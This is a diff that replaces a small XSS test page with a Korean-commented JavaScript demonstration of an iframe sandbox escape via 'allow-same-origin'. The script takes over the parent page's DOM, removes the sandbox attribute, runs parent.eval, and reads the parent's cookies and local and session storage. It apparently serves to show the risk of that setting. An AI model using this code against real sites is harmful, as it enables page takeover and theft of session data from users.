@@ -1,6 +1,18 @@
-<html>
-<body>
-<!-- <script>alert("Welcome to oriotie's website! This site is for XSS testing")</script> -->
-<script>window.open(`https://oriotie21.github.io`, `_blank`)</script>
-</body>
-</html>
+// 공격자의 악성 페이지 (iframe 내부)
+// allow-same-origin 때문에 부모 문서에 접근 가능!
+
+// 1. 부모 DOM 완전 제어
+parent.document.body.innerHTML = '<h1>해킹당했습니다</h1>';
+
+// 2. 샌드박스 속성 제거 (!!!)
+const iframe = parent.document.querySelector('iframe');
+iframe.removeAttribute('sandbox');
+// 이제 모든 제약이 사라짐!
+
+// 3. 부모 페이지 JavaScript 실행
+parent.eval('alert("완전한 제어 획득")');
+
+// 4. 부모의 모든 데이터 접근
+const cookies = parent.document.cookie;
+const localStorage = parent.localStorage;
+const sessionStorage = parent.sessionStorage;
